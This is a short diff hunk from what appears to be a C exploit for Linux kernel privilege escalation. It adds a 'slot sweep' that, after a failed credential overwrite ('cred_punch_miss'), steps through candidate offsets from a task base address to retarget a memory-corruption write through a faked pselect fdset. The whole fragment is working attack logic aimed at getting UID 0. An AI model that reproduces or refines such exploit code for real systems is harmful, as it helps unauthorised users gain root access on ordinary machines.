@@ -2028,6 +2028,23 @@ void do_pselect_fake_lock_route(void) {
                     cred_mode ? "cred" : "oracle", route_attempt, max_att);
             live_sync_log("UID0",
                           cred_mode ? "cred_punch_miss" : "oracle_punch_miss");
+            if (cred_mode && !canary && g_uid0_task_base) {
+              /* SLOT SWEEP: the comm canary proved stores land EXACTLY at
+               * the aimed slot — a miss means the SLOT is wrong for this
+               * build. Advance to the next candidate; the next attempt
+               * rebuilds the fdset from pselect_custom_target. */
+              size_t ncand = sizeof(g_uid0_slot_candidates) /
+                             sizeof(g_uid0_slot_candidates[0]);
+              if ((size_t)g_uid0_slot_idx + 1 < ncand) {
+                g_uid0_slot_idx++;
+                pselect_custom_target =
+                    g_uid0_task_base +
+                    (uintptr_t)g_uid0_slot_candidates[g_uid0_slot_idx];
+                pr_info("slot sweep -> +0x%llx\n",
+                        (unsigned long long)
+                            g_uid0_slot_candidates[g_uid0_slot_idx]);
+              }
+            }
           }
         } else {
         pr_info("SWAP_NOCFI: skipping post-walk cfi probe fake_fops=%016zx\n",
